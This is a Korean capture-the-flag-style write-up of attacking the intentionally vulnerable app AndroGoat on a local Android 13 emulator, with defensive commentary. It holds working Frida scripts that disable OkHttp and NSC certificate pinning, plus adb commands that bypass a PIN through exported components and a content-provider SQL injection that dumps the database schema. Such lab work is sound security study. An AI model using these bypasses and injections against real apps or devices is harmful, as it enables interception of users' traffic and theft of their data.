---
{"title":"AndroGoat 취약점 실증 라이트업 — Android 13 / targetSdk 33","date":"2026-11-12","category":"ctf","tags":["AndroGoat","Android","Frida","Burp Suite","SSL Pinning","WebView","Insecure Storage","Hardcoded Secret","OWASP MASVS"],"summary":"의도적 취약 앱 AndroGoat의 전 취약점 카테고리를 API 33 에뮬레이터에서 실증하고, adb·run-as·logcat·sqlite·Frida·프록시로 실제 값을 추출해 증명한 라이트업.","section":["AndroGoat"]}
---

> 이 글은 내가 직접 만든 **로컬 Android 13 에뮬레이터**에서, 연습용으로 공개된 취약 앱 **AndroGoat**([github.com/satishpatnayak/AndroGoat](https://github.com/satishpatnayak/AndroGoat))만 가지고 진행한 기록이다. 중간에 나오는 AWS·OpenAI 키 같은 값은 앱이 연습용으로 넣어 둔 가짜라, 실제로는 아무 데도 접속되지 않는다. 당연한 얘기지만 같은 걸 남의 기기나 서비스에 하면 불법이다.

## 왜 이걸 했나

AndroGoat는 한마디로 "일부러 허술하게 만든 안드로이드 앱"이다. 로그인 정보를 평문으로 저장하거나, 열어두면 안 될 문을 열어두거나, 비밀 키를 코드에 그대로 박아두는 식으로, 모바일 앱에서 자주 터지는 실수를 종류별로 모아 놨다. 목표는 단순하다. 이 실수들을 **직접 터뜨려 보고**, `adb·run-as·logcat·sqlite·Frida·프록시` 같은 도구로 **실제 값을 꺼내서** 정말 뚫린다는 걸 눈으로 확인하는 것.

여기에 하나를 더 얹었다. 요즘 안드로이드(targetSdk 33)는 기본값이 꽤 깐깐해져서, 예전엔 쉽게 되던 공격이 그냥은 안 된다. 그래서 항목마다 **"최신 OS는 이걸 막아주는가, 앱은 그 보호를 어떻게 다시 뚫는가"** 를 같이 적었다. 잘 안 된 것, 애매하게 끝난 것도 숨기지 않고 그대로 남겼다.

## 다룬 것

- 통신 가로채기(HTTP·HTTPS·SSL 피닝), 무방비 컴포넌트, 안전하지 않은 저장소
- 입력값 검증(XSS·SQL 인젝션·WebView), 측면 채널 유출, 하드코딩된 비밀
- 루트·에뮬레이터·생체 인증·바이너리 패칭 탐지와 그 우회, 그리고 앱 전역 설정

실제로 친 명령과 그 결과(콘솔·로그) 원본은 전부 [첨부파일 문서](/categories/ctf--399cf450f2.html)에 모아 뒀다. 본문의 "증거" 링크를 누르면 그 문서의 해당 위치로 넘어간다.

## 먼저, 용어부터

보안 용어가 쉴 새 없이 나오는데 처음 보면 벽처럼 느껴진다. 일상 비유로 미리 풀어두면 뒤가 훨씬 수월하다.

- **앱 / APK** — 앱은 폰에서 도는 프로그램, APK는 그 앱을 통째로 담은 설치 파일이다. 앱을 깔면 내 폰에도 공격자 손에도 똑같은 APK가 생긴다. 그래서 *앱 안에 비밀을 숨겨도 숨긴 게 아니다.*
- **샌드박스** — 앱마다 주어지는 잠긴 방. 다른 앱은 이 방에 함부로 못 들어온다. 안드로이드의 기본 울타리다.
- **권한 / exported** — "이 방 문을 다른 앱에게 열어줄까?"를 정하는 설정. `exported=true`는 옆문을 열어둔 상태다.

도구들도 한 번에 정리하면 이렇다.

| 도구 | 비유 | 하는 일 |
|---|---|---|
| 에뮬레이터 | 컴퓨터 속 가짜 스마트폰 | 진짜 폰을 위험하게 하지 않고 연습 |
| adb | 폰에 꽂는 만능 리모컨 | PC에서 폰에 명령을 보냄 |
| run-as | 앱의 방 열쇠를 잠깐 빌림 | 연습(디버그) 앱의 자기 방에 들어가 파일을 봄 |
| root | 폰의 마스터키 | 원래 못 보는 곳까지 다 봄 |
| logcat | 앱들이 쓰는 일기장 | 앱이 몰래 적어 둔 메모를 읽음 |
| sqlite | 앱이 쓰는 작은 엑셀 표 | 저장된 아이디·비밀번호 표를 꺼냄 |
| 프록시(Burp) | 편지 가로채는 우체국 직원 | 앱과 서버가 주고받는 내용을 중간에서 봄 |
| 인증서 · 피닝 | 편지 봉투의 도장 확인 | "이 도장만 믿어"라고 약속하면 가짜 봉투를 걸러냄 |
| Frida | 실행 중인 앱의 생각을 바꾸는 요술봉 | 앱이 도는 중에 함수의 대답을 바꿔치기 |

> **한마디로,** 일부러 허술하게 지은 연습용 집에 들어가 열린 창문·숨긴 열쇠·연필로 적은 비밀번호를 찾아내고, 그 집 경비원(루트·지문 검사)을 요술봉(Frida)으로 속여 보는 작업이다. 그리고 요즘 지은 집은 이런 걸 얼마나 막아주는지 같이 확인한다.

---

## 0. 실습 환경

> **쉽게 말하면,** 게임을 하려면 게임기랑 조종기부터 챙기듯이, 실습도 가짜 폰(에뮬레이터)과 도구(adb·Frida·Burp)를 먼저 깔아둬야 한다. 이 장은 그 준비물 소개다.

| 구성 | 버전 / 설정 |
|---|---|
| 호스트 | Windows 11, Android Studio (JBR 21) |
| 에뮬레이터 | Pixel 6 AVD, **Android 13 (API 33) Google APIs x86_64** |
| 권한 | `adb root` (Google Play 이미지가 아닌 Google APIs 이미지를 써야 가능) |
| 동적 분석 | Frida 17.26.2 (frida-server android-x86_64, `-D` 데몬 모드) |
| 프록시 | Burp Suite Community 2026.3.3, 에뮬레이터 전역 프록시 `10.0.2.2:8080` |
| 정적 분석 | JADX-GUI 1.5.6, 원본 소스 |
| 앱 빌드 | Android Studio debug 빌드, `targetSdkVersion 33`, `minSdkVersion 19` |

**증거**: [`00_setup/01_environment.txt`](/posts/2026-11-12-ag-00_setup-01_environment.html)
```
$ adb shell whoami                         → root
$ adb shell getprop ro.build.version.sdk   → 33
$ frida-ps -Uai                            → AndroGoat - Insecure App (Kotlin)  owasp.sat.agoat
$ adb shell ls -l /system/etc/security/cacerts/9a5ba575.0
  -rw-r--r-- 1 root root 1391 ... 9a5ba575.0      ← Burp CA (시스템 저장소)
$ dumpsys package owasp.sat.agoat
  targetSdk=33  pkgFlags=[ DEBUGGABLE ... ALLOW_BACKUP ]
```
<img src="/assets/androgoat/attachments/00_setup/02_app_main.png" alt="앱 메인 화면" width="420">

### 0-1. 트러블슈팅: API 33에서 Burp CA를 시스템 저장소에 넣기
- Android 7 이상에서는 앱이 기본적으로 사용자 인증서를 신뢰하지 않는다. 그래서 Burp CA를 시스템 저장소(`/system/etc/security/cacerts`)에 넣어야 한다.
- `emulator -writable-system`으로 실행한 뒤 `adb remount`를 시도했지만 실패했다.
  ```
  avb_user_verity.c:205: ERROR: Error writing to partition 'vbmeta'
  remount failed
  ```
- **해결: tmpfs 오버레이**
  1. 기존 인증서를 복사해 둔다.
  2. `cacerts` 위에 tmpfs를 마운트한다.
  3. 기존 인증서와 Burp CA(`subject_hash_old` 이름 `9a5ba575.0`)를 함께 넣는다.
  4. 권한(644)과 SELinux 컨텍스트(`system_file`)를 맞춘다.
- 재부팅하면 초기화되므로 기동 스크립트에서 매번 다시 적용한다.
- Android 14부터는 인증서 저장소가 APEX(`/apex/com.android.conscrypt/cacerts`)로 옮겨져서 이 방법이 그대로 통하지 않는다.

### 0-2. 트러블슈팅: Frida
- `adb root`를 다시 실행하면 frida-server가 함께 종료된다. 그래서 `-D` 데몬 모드로 다시 띄운다.
- `frida -q -l x.js`로 실행하면 스크립트를 올리자마자 종료되면서 후킹도 풀린다. 후킹을 유지하려면 `-t <초>`를 함께 쓴다.

---

## 1. Network Intercepting  (`TrafficActivity`)

> **쉽게 말하면,** 앱이 보내는 편지를 인터넷이라는 우체부가 나른다. 그냥 엽서로 보내면(HTTP) 중간에서 다 읽힌다. 자물쇠 봉투(HTTPS)를 써도, 앱이 '이 도장만 믿어'(피닝) 약속을 안 하거나 그 약속을 요술봉으로 지워버리면 또 읽힌다. 그걸 직접 보여준다.
<img src="/assets/androgoat/attachments/01_network/01_network_screen.png" alt="Network 화면" width="420">

### 취약 코드
`network_security_config.xml` ([원본](/posts/2026-11-12-ag-01_network-00_src_network_security_config.html))
```xml
<base-config cleartextTrafficPermitted="true">      <!-- ① 평문 HTTP 허용 -->
    <trust-anchors>
        <certificates src="system" />
        <certificates src="user" />                  <!-- ② 사용자 CA 신뢰 -->
    </trust-anchors>
</base-config>
<domain-config>
    <domain includeSubdomains="true">cve.org</domain>
    <pin-set expiration="2050-01-01"> ... </pin-set>  <!-- ③ NSC 피닝 -->
</domain-config>
```
`TrafficActivity.kt` ([원본](/posts/2026-11-12-ag-01_network-00_src_TrafficActivity.html))
- HTTP 버튼: `http://demo.testfire.net`
- HTTPS 버튼: `https://owasp.org` (피닝 없음)
- OKHTTP3 버튼: `CertificatePinner`에 `owasp.org` 해시 3개를 하드코딩
- NATIVE 버튼: `https://cve.org`에 ③ 적용. 실패해도 `onFailure(...) {}`가 비어 있어 에러가 남지 않는다.

### 정책 vs 코드
| targetSdk 33 기본 정책 | 앱이 되뚫은 방법 |
|---|---|
| API 28+: 평문 HTTP 기본 차단 | ① `cleartextTrafficPermitted="true"` |
| API 24+: 사용자 CA 불신 | ② `<certificates src="user"/>` → 시스템 저장소에 주입하지 않아도 가로채기 가능 |

### 1-1. HTTP 평문 가로채기

**발화**: Network Intercepting 화면에서 **HTTP** 버튼을 누른다. 앱이 OkHttp로 `http://demo.testfire.net`에 요청을 보낸다.

<img src="/assets/androgoat/attachments/01_network/02_http_button_toast.png" alt="HTTP 버튼 토스트" width="420">

**추출 (Burp Proxy)**: 요청이 암호화 없이 그대로 보인다.
```
GET / HTTP/1.1
Host: demo.testfire.net
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
User-Agent: okhttp/4.9.3          ← 앱(OkHttp)이 보낸 요청
```
<img src="/assets/androgoat/attachments/01_network/04_burp_http_request.png" alt="Burp HTTP 요청" width="420">

**정책 vs 코드**
- targetSdk 28 이상이면 평문 HTTP는 기본으로 차단된다(`CLEARTEXT communication ... not permitted`).
- 이 앱은 `cleartextTrafficPermitted="true"`로 그 정책을 직접 꺼서 요청이 평문으로 나갔다.
- 같은 네트워크에 있는 공격자라면 쿠키, 토큰, 입력값을 그대로 볼 수 있고 내용을 바꿔 칠 수도 있다.

**한계 ⚠️**
- `demo.testfire.net` 서버가 응답하지 않아 응답 본문은 확보하지 못했다(Burp 상태 코드가 빈칸).
- 호스트 PC에서 직접 측정해도 연결되지 않았다. 따라서 앱이나 프록시 문제가 아니라 대상 서버 쪽 문제다. ([측정 기록](/posts/2026-11-12-ag-01_network-03_http_server_unreachable_host.html))
  ```
  Resolve-DnsName demo.testfire.net  → 65.61.137.117   (Burp에 기록된 IP와 같음)
  Test-NetConnection -Port 80        → TcpTestSucceeded : False
  ```
- 그래도 이 취약점의 핵심은 **요청이 평문으로 나간다는 것**이고, 그건 위 캡처로 충분히 증명된다.

### 1-2. HTTPS 가로채기 (피닝 없음)

**발화**: **HTTPS** 버튼을 누른다. 앱이 피닝 없이 `https://owasp.org`에 요청을 보낸다.

<img src="/assets/androgoat/attachments/01_network/05_https_button_toast.png" alt="HTTPS 버튼 토스트" width="420">

**추출 (Burp Proxy)**: TLS 통신인데도 Burp가 중간에서 복호화해서 요청과 응답이 모두 보인다.
```
GET / HTTP/1.1                     HTTP/2 200 OK
Host: owasp.org                    Content-Security-Policy: ...
User-Agent: okhttp/4.9.3           (HTML 89,258 bytes, <title>OWASP Foundation ...)
```
<img src="/assets/androgoat/attachments/01_network/07_burp_https_decrypted.png" alt="Burp HTTPS 복호화" width="420">

앱도 Burp가 다시 암호화해 준 응답을 정상으로 받아들였다. 앱이 `println()`으로 찍은 본문이 logcat에 남는다. ([원본](/posts/2026-11-12-ag-01_network-06_https_logcat_response.html))
```
I System.out: <!DOCTYPE html><html ... <title>OWASP Foundation - The Open Source Foundation for Application Security</title>
```
→ 앱은 **중간자(Burp)가 끼어든 것을 전혀 알아채지 못했다.**

**정책 vs 코드**
- API 24 이상에서는 앱이 **사용자 CA를 신뢰하지 않는 것이 기본값**이다. 그래서 일반 사용자 기기에 공격자 인증서를 심어도 HTTPS는 가로챌 수 없는 게 정상이다.
- 이 앱은 `<certificates src="user"/>`로 사용자 CA를 다시 신뢰하도록 설정했다. 그래서 루트 권한 없이 "설정 → 인증서 설치"만으로도 가로챌 수 있는 상태다.
- 이번 실습은 시스템 저장소에 CA를 넣는 더 강한 조건으로 진행했다. 사용자 CA만 설치해도 (루트 없이) 같은 가로채기가 가능하다는 뜻이다.
- 피닝이 없으면 시스템 저장소에 신뢰된 CA가 하나라도 악용되는 순간(루팅 기기, 기업 MDM, 악성 프로파일 등) 통신이 노출된다.

### 1-3. Certificate Pinning: OkHttp3 (Frida 우회)

**취약 코드** (`TrafficActivity.doPinning()`)
```kotlin
val pinner1 = CertificatePinner.Builder()
    .add("owasp.org", "sha256/5gsjyidrmWjcLRClfCk+Dd6O0nx1CyFrVUW5wVkwEx0=")
    .add("owasp.org", "sha256/kIdp6NNEd8wsugYyyIYFsi1ylMCED3hZbSR8ZFsa/A4=")
    .add("owasp.org", "sha256/mEflZT5enoR1FuXLgYYGqnVEoZvmf9c2bVBpiOjYQ0c=")
    .build()
val client = OkHttpClient.Builder().certificatePinner(pinner1).build()
...
Log.v("Response", "${response.body?.string()}")   // 성공해야만 도달
```
피닝을 **앱 코드(OkHttp 라이브러리)** 에서 검사한다. 그래서 OS 설정과 무관하게, 앱 프로세스 안의 함수 하나만 무력화하면 우회된다.

**① 발화 (Burp 켬)**: 피닝 실패 ([원본](/posts/2026-11-12-ag-01_network-08_okhttp3_pinning_fail_with_burp.html))
```
SSLPeerUnverifiedException: Certificate pinning failure!
  Peer certificate chain:
    sha256/+eAu61/...: CN=owasp.org,OU=PortSwigger CA      ← Burp가 위조한 인증서
    sha256/q9Zol+1G...: CN=PortSwigger CA
  Pinned certificates for owasp.org:
    sha256/5gsjyidr...  sha256/kIdp6NNE...  sha256/mEflZT5e...
  at okhttp3.CertificatePinner.check$okhttp(CertificatePinner.kt:200)   ← 우회 지점
```
→ 이 요청은 TLS 단계에서 끊겨서 **Burp HTTP history에 남지 않는다** (아래 캡처의 78번과 79번 사이 참고).

**② 대조 실험 (Burp 끔)**: **그래도 실패** ⚠️ ([원본](/posts/2026-11-12-ag-01_network-09_okhttp3_pinning_fail_without_burp_control.html))
```
Peer certificate chain:
  sha256/vhFlNS4e...: CN=owasp.org
  sha256/LoMHBott...: CN=YR1,O=Let's Encrypt,C=US
  sha256/fk6IOKit...: CN=Root YR,O=ISRG,C=US
  sha256/C5+lpZ7t...: CN=ISRG Root X1,O=Internet Security Research Group
Pinned certificates for owasp.org:
  sha256/5gsjyidr...  sha256/kIdp6NNE...  sha256/mEflZT5e...   → 일치하는 해시 없음
```

**③ Frida 우회**: [`frida/bypass-okhttp3-pinning.js`](/posts/2026-11-12-ag-frida-bypass-okhttp3-pinning.html)
```javascript
var CP = Java.use("okhttp3.CertificatePinner");
CP["check$okhttp"].implementation = function (hostname, certsFn) {
    console.log("[bypass] CertificatePinner.check$okhttp(" + hostname + ") → skip");
};   // 예외를 던지지 않고 그냥 반환
```
- 후킹 대상은 ①의 스택 트레이스 맨 위 `check$okhttp`로 정했다. Kotlin의 `internal` 함수는 바이트코드에서 `이름$모듈명` 형태가 된다.

콘솔 ([원본](/posts/2026-11-12-ag-01_network-10_okhttp3_frida_bypass_console.html))
```
[*] OkHttp3 CertificatePinner bypass loaded
[bypass] CertificatePinner.check$okhttp(owasp.org) → skip
```
logcat: 원래는 도달할 수 없던 `Log.v("Response", ...)`가 실행됨 ([원본](/posts/2026-11-12-ag-01_network-11_okhttp3_frida_bypass_logcat.html))
```
V Response: <!DOCTYPE html><html ... OWASP Foundation ...
```
Burp: **79번** `https://owasp.org` → `200`, 89,259 bytes가 복호화되어 보임 (12:38:01)
<img src="/assets/androgoat/attachments/01_network/12_burp_okhttp3_after_bypass.png" alt="Burp OkHttp3 우회 후" width="420">

**정책 vs 코드**
- OkHttp `CertificatePinner`는 OS 정책이 아니라 **앱 내부 로직**이다. targetSdk와 상관없이, 루팅 기기에서 Frida로 메서드 하나만 바꾸면 무력화된다.
- 피닝은 "신뢰된 CA를 악용한 중간자 공격"은 막지만, **공격자가 기기와 앱 프로세스를 장악한 경우는 막지 못한다**. 그래서 루팅/Frida 탐지, 무결성 검증과 함께 써야 한다.

**한계 / 교훈 ⚠️**
- ②에서 보듯 이 피닝은 **정상 환경에서도 실패**한다. owasp.org가 Let's Encrypt 체인으로 바뀌었는데 핀은 예전 값이라, 실제 서비스였다면 **모든 사용자에게 장애**가 났을 것이다.
- 그래서 이번 우회는 "보안 기능을 뚫었다"는 의미와 함께 **"원래 동작하지 않던 기능을 동작하게 만들었다"** 는 의미도 가진다.
- 교훈: 핀은 리프 인증서 대신 **중간/루트 CA 공개키에 걸고**, **백업 핀**을 함께 두고, 원격 설정 등으로 **갱신할 수 있는 구조**여야 한다.

### 1-4. Certificate Pinning: Native / NSC (Frida 우회)

**취약 코드**
- 피닝 설정은 코드가 아니라 `network_security_config.xml`의 `<pin-set>`에 있다(`cve.org`, 핀 3개, 만료 2050-01-01).
- 검사는 앱이 아니라 **Android OS**(`NetworkSecurityTrustManager`)가 TLS 연결 중에 한다.
- 앱 코드의 `onFailure(...) {}`가 비어 있어서, 실패해도 화면과 logcat 어디에도 흔적이 남지 않는다.

**① 발화 (Burp 켬)**: 실패. 숨겨진 예외는 Frida로 빈 콜백을 후킹해서 꺼냈다 ([원본](/posts/2026-11-12-ag-01_network-13_nsc_pinning_fail_with_burp.html), 스크립트 [`frida/log-okhttp-failure.js`](/posts/2026-11-12-ag-frida-log-okhttp-failure.html))
```
[onFailure] https://cve.org/
  javax.net.ssl.SSLHandshakeException: Pin verification failed
  caused by: java.security.cert.CertificateException: Pin verification failed
```

**② 대조 실험 (Burp 끔)**: 성공 ([원본](/posts/2026-11-12-ag-01_network-14_nsc_pinning_ok_without_burp_control.html))
```
[onResponse] https://cve.org/ -> HTTP 200
```
→ OkHttp3와 달리 **이 핀은 유효하다**. ①의 실패는 **Burp 인증서 때문**이라는 것이 증명됨.

**③ Frida 우회 (Burp 켬)**: [`frida/bypass-nsc-pinning.js`](/posts/2026-11-12-ag-frida-bypass-nsc-pinning.html)
```javascript
var NSTM = Java.use("android.security.net.config.NetworkSecurityTrustManager");
NSTM.checkPins.implementation = function (chain) {
    console.log("[bypass] NetworkSecurityTrustManager.checkPins(" + chain.size() + " certs) → skip");
};
```
콘솔 ([원본](/posts/2026-11-12-ag-01_network-15_nsc_frida_bypass_console.html))
```
[*] NSC pinning bypass loaded
[bypass] NetworkSecurityTrustManager.checkPins(2 certs) → skip     ← Burp 인증서 체인 2개
[onResponse] https://cve.org/ -> HTTP 200
```
Burp: **84번** `https://www.cve.org` → `200` (12:42:12). `cve.org`가 `www.cve.org`로 리다이렉트되어 그 주소로 기록됨.
<img src="/assets/androgoat/attachments/01_network/16_burp_nsc_after_bypass.png" alt="Burp NSC 우회 후" width="420">

**정책 vs 코드**
- NSC 피닝은 OS가 검사하기 때문에 OkHttp 피닝보다 앱 코드 변조에 덜 의존한다.
- 하지만 검사하는 코드가 **앱 프로세스 안에 올라온 프레임워크 코드**라서, 루팅 + Frida 환경에서는 `checkPins` 하나만 바꾸면 똑같이 무력화된다.
- 앱의 빈 `onFailure`는 보안 이벤트(피닝 실패)를 감지하고도 기록하지 않는 문제다. 공격 시도를 탐지하거나 분석할 근거가 남지 않는다.

**OkHttp3 피닝과 비교**

| | OkHttp3 (3-1-3) | NSC (3-1-4) |
|---|---|---|
| 핀 위치 | Kotlin 코드 | XML 설정 |
| 검사 주체 | OkHttp 라이브러리 | Android OS 프레임워크 |
| 후킹 지점 | `okhttp3.CertificatePinner.check$okhttp` | `NetworkSecurityTrustManager.checkPins` |
| Burp 없이 정상 동작 | ❌ (핀이 오래됨) | ✅ |
| Frida 우회 | ✅ | ✅ |

---

## 2. Unprotected Android Components

> **쉽게 말하면,** 집에 정식 현관(비밀번호)이 있는데 옆문이 잠겨 있지 않다. 그 옆문으로 비밀번호 없이 들어가 안방(PIN 화면)까지 가고, 금고 속 명단(PIN 데이터베이스)까지 꺼낸다.

<img src="/assets/androgoat/attachments/02_components/01_components_menu.png" alt="Components 메뉴" width="420">

### 개요
`exported="true"`인 컴포넌트는 **다른 앱이나 adb가 직접 호출할 수 있다**. 그런데 권한(`android:permission`) 검사가 없으면 앱이 의도한 절차(PIN 확인 등)를 건너뛸 수 있다.

| 컴포넌트 | 매니페스트 | 숨겨진 기능 | 결과 |
|---|---|---|---|
| Activity `AccessControl1ViewActivity` | `exported="true"` + 딥링크 `androgoat://vulnapp` | PIN 인증 후 화면 | ✅ PIN 없이 진입 (2-1, 2-2) |
| Service `DownloadInvoiceService` | `exported="true"` | 인보이스 다운로드 | ✅ 포그라운드일 때만 ⚠️ (2-3) |
| Receiver `ShowDataReceiver` | `exported="true"` | 계정 정보 토스트 | ✅ (2-4) |
| Provider `userpinsprovider` | `exported="true"`, 권한 없음 | 사용자 PIN DB | ✅ 읽기, 쓰기, SQLi (2-5) |

### 실험 조건: "일반 권한"으로 공격
- 지금 adb는 `adb root` 상태라 명령이 **root**로 실행된다. root는 원래 무엇이든 열 수 있으므로, 그 상태의 성공은 취약점 증거가 되지 않는다.
- 그래서 모든 공격 명령을 `su shell`로 **일반 사용자(uid 2000, shell)** 권한으로 낮춰서 실행했다.
  ```
  $ adb shell su shell id
  uid=2000(shell) gid=2000(shell)
  ```
- **대조 실험**: 같은 권한으로 `exported="false"`인 화면을 열면 OS가 막는다. ([원본](/posts/2026-11-12-ag-02_components-06_activity_bypass_console.html))
  ```
  $ adb shell su shell am start -n owasp.sat.agoat/.HardcodeViewActivity
  java.lang.SecurityException: Permission Denial: starting Intent { cmp=owasp.sat.agoat/.HardcodeViewActivity }
      from null (pid=7599, uid=2000) not exported from uid 10174
  ```
  → 아래 공격이 성공한 이유는 **오직 `exported="true"` 때문**이다.

### 2-0. 정상 흐름: PIN이 있어야 들어갈 수 있다
1. PIN을 `7391`로 설정 <img src="/assets/androgoat/attachments/02_components/02_set_pin_input.png" alt="PIN 설정" width="420">
2. PIN 확인 화면 <img src="/assets/androgoat/attachments/02_components/03_pin_created_verify_screen.png" alt="PIN 확인 화면" width="420">
3. 틀린 PIN `0000` 입력 → `Incorrect PIN entered` <img src="/assets/androgoat/attachments/02_components/04_wrong_pin_rejected.png" alt="틀린 PIN 거부" width="420">

**취약 코드** (`AccessControlIssue1Activity.kt`): PIN이 맞으면 다음 화면을 연다.
```kotlin
if (isPinCorrect(pinValue.text.toString())) {
    val myIntent = Intent(this, AccessControl1ViewActivity::class.java)
    startActivity(myIntent)
}
```
PIN 검사는 **이전 화면(버튼 클릭)** 에만 있다. 정작 보호해야 할 `AccessControl1ViewActivity`는 자기가 어떻게 열렸는지 확인하지 않는다.

### 2-1. Activity 직접 호출로 PIN 우회
앱을 홈 화면으로 보낸 뒤, PIN 입력 없이 실행했다. ([원본](/posts/2026-11-12-ag-02_components-06_activity_bypass_console.html))
```
$ adb shell su shell am start -n owasp.sat.agoat/.AccessControl1ViewActivity
Starting: Intent { cmp=owasp.sat.agoat/.AccessControl1ViewActivity }
```
→ PIN 확인 없이 **"Welcome User! Please download Invoice."** 화면이 열렸다.
<img src="/assets/androgoat/attachments/02_components/07_activity_bypass_result.png" alt="PIN 없이 진입" width="420">

### 2-2. 커스텀 URL 스킴(딥링크)으로 PIN 우회
매니페스트
```xml
<activity android:name=".AccessControl1ViewActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:host="vulnapp" android:scheme="androgoat" />
    </intent-filter>
</activity>
```
앱을 **완전히 종료(force-stop)** 한 뒤, 패키지 이름이나 클래스 이름 없이 URL만 보냈다. ([원본](/posts/2026-11-12-ag-02_components-08_deeplink_console.html))
```
$ adb shell su shell am start -W -a android.intent.action.VIEW -d androgoat://vulnapp
Status: ok
LaunchState: COLD                                          ← 꺼져 있던 앱이 새로 실행됨
Activity: owasp.sat.agoat/.AccessControl1ViewActivity      ← 곧장 PIN 뒤 화면으로
```
<img src="/assets/androgoat/attachments/02_components/09_deeplink_result.png" alt="딥링크로 진입" width="420">
- 딥링크는 **다른 앱, 웹 페이지 링크, QR 코드, 메시지 링크** 등 어디서든 보낼 수 있다. 그래서 2-1보다 공격 경로가 넓다.
- `androgoat://` 같은 커스텀 스킴은 **누구나 같은 스킴을 등록할 수 있어** 소유가 증명되지 않는다. 검증된 App Links(`https` + `autoVerify`)를 써야 한다.

### 2-3. Service 직접 호출로 인보이스 다운로드
**[1] 앱이 백그라운드일 때: 차단됨** ([원본](/posts/2026-11-12-ag-02_components-10_service_background_console.html))
```
$ adb shell su shell am startservice -n owasp.sat.agoat/.DownloadInvoiceService
Error: app is in background uid null
logcat: W ActivityManager: Background start not allowed: service Intent { cmp=owasp.sat.agoat/.DownloadInvoiceService }
        ... from pid=7715 uid=2000 pkg=com.android.shell
```
**[2] 앱이 화면에 떠 있을 때(메인 화면, PIN 입력 안 함): 성공** ([원본](/posts/2026-11-12-ag-02_components-11_service_foreground_console.html))
```
$ adb shell su shell am startservice -n owasp.sat.agoat/.DownloadInvoiceService
I DOWNLOAD: Service onCreate
I DOWNLOAD: Invoice is being downloaded
$ adb shell ls -l /sdcard/Download/
-rw-rw---- 1 u0_a165 media_rw 72 2026-11-12 03:48 1794455294923_invoice.txt
$ adb shell cat /sdcard/Download/*_invoice.txt
This is invoice for product purchased on Aug 12th.
Thanks,
AndroGoat
```
<img src="/assets/androgoat/attachments/02_components/11_service_foreground_toast.png" alt="서비스 토스트" width="420">

### 2-4. Broadcast Receiver 호출로 계정 정보 노출
**취약 코드** (`ShowDataReceiver.kt`)
```kotlin
override fun onReceive(context: Context, intent: Intent) {
    Toast.makeText(context, "Username is CrazyUser, Password is CrazyPassword and Key is 123myKey456", ...).show()
}
```
**[1] 앱이 백그라운드일 때: 리시버는 실행되지만 토스트는 OS가 숨김** ([원본](/posts/2026-11-12-ag-02_components-12_receiver_console.html))
```
$ adb shell su shell am broadcast -n owasp.sat.agoat/.ShowDataReceiver
Broadcast completed: result=0
logcat: E NotificationService: Suppressing toast from package owasp.sat.agoat by user request.
```
- Android 13에서는 알림 권한(`POST_NOTIFICATIONS`)이 없는 앱이 **백그라운드에서 띄운 토스트**를 OS가 표시하지 않는다.
- 그래도 코드는 실행됐다. Frida로 `Toast.makeText`를 가로채 확인했다. ([원본](/posts/2026-11-12-ag-02_components-13_receiver_background_frida.html), 스크립트 [`frida/log-toast.js`](/posts/2026-11-12-ag-frida-log-toast.html))
  ```
  [ShowDataReceiver.onReceive] intent=Intent { flg=0x400010 cmp=owasp.sat.agoat/.ShowDataReceiver }
  [Toast.makeText] Username is CrazyUser, Password is CrazyPassword and Key is 123myKey456
  ```
**[2] 앱이 화면에 떠 있을 때: 토스트로 그대로 노출**
<img src="/assets/androgoat/attachments/02_components/14_receiver_foreground_toast_credentials.png" alt="계정 정보 토스트" width="420">

### 2-5. Content Provider로 PIN DB 읽기, 쓰기, SQL 인젝션
**매니페스트**: `exported="true"`인데 `readPermission`과 `writePermission`이 없다.
```xml
<provider android:name=".ContentProviderActivity"
          android:authorities="owasp.sat.agoat.provider.userpinsprovider"
          android:exported="true"/>
```
전체 콘솔: [원본](/posts/2026-11-12-ag-02_components-15_provider_console.html)

**① 읽기: 전체 사용자 PIN 덤프**
```
$ adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
Row: 0 id=3, username=Admin, pin=Admin
Row: 1 id=1, username=AndroGoat, pin=AndroGoat
Row: 2 id=2, username=root, pin=toor
```
**② 쓰기: 계정 삽입**
```
$ content insert --uri .../user_pins --bind username:s:attacker --bind pin:s:0000
Row: 2 id=4, username=attacker, pin=0000
```
**③ 수정: Admin PIN 변경**
```
$ content update --uri .../user_pins --bind pin:s:hacked --where "username='Admin'"
Row: 0 id=3, username=Admin, pin=hacked
```
**④ SQL 인젝션: `selection`에 SQL을 이어 붙여 DB 구조 전체를 덤프**
```
$ content query --uri .../user_pins --projection username:pin \
      --where "1=0) UNION SELECT name, sql FROM sqlite_master WHERE (1=1"
Row: 0 username=android_metadata, pin=CREATE TABLE android_metadata (locale TEXT)
Row: 1 username=sqlite_sequence,  pin=CREATE TABLE sqlite_sequence(name,seq)
Row: 2 username=user_pins,        pin=CREATE TABLE user_pins (id INTEGER PRIMARY KEY AUTOINCREMENT, ...)
```
- 원인: `query()`가 외부에서 받은 `selection`을 `SQLiteQueryBuilder.query()`에 그대로 넘긴다. 앱이 `setStrict(true)`나 허용 컬럼 목록(`setProjectionMap`)을 쓰지 않는다.
- 같은 DB에 다른 테이블이 있었다면 그 테이블도 이 방법으로 읽을 수 있다.

**⑤ 원상복구**: 삽입한 계정을 지우고 Admin PIN을 되돌렸다.

### 정책 vs 코드 (targetSdk 33)
| 정책 | 효과 | 이 앱 |
|---|---|---|
| API 31+: intent-filter가 있는 컴포넌트는 `exported`를 **반드시 명시** | 실수로 열리는 것을 막음 | `exported="true"`를 **명시해서** 일부러 열었다 → 정책이 막아 주지 못함 |
| API 26+: 백그라운드 앱의 서비스 시작 금지 | 2-3 [1] 차단 | 앱이 포그라운드면 무력함 ⚠️ |
| API 33: 알림 권한이 없는 앱의 백그라운드 토스트 숨김 | 2-4 [1]에서 화면 노출 차단 | 코드는 실행됨. 포그라운드면 노출됨 ⚠️ |
| `exported="false"`인 컴포넌트는 외부 호출 차단 | 대조 실험에서 `SecurityException` | 취약 컴포넌트는 `true`라 해당 없음 |
| Provider 권한 | `readPermission`, `writePermission`, `signature` 권한으로 제한 가능 | 아무 권한도 없음 → 누구나 읽고 쓰고 인젝션 가능 |

###  한계
